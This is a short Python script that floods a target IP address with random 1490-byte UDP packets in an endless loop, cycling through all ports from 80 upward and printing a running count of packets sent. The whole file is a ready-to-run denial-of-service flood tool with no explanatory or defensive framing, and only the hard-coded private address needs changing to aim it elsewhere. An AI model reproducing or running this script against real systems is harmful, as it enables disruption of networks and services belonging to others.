import sys
import os
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

ip = "192.168.0.1"
port = 80
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print (sent,ip,port)
     if port == 65534:
       port = 1
